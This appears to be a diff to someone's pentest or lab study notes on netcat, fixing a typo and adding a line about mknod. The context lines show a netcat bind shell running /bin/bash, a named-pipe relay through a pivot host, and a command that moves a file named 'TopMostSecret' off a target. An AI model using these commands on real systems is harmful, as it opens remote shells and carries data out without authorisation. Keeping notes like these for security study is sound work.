@@ -82,4 +82,7 @@ nc -l -p <any unfiltered port> -e /bin/bash
 nc -lp 9001 0< pipe | nc -lp 9002 1> pipe    (on pivot)(listening port must be up first)
             0< is input, we are creating a pipe file on through a listening port, a named pipe only lives in memory NOT in file storage.
   nc 10.0.0.103 9002 > TopMostSecret    (on target)
-  nc nc 10.0.0.103 9001 > Testfile    (on OUR machine)
+  nc 10.0.0.103 9001 > Testfile    (on OUR machine)
+
+mknod <pipeName> 
+  just makes a node, not a directory
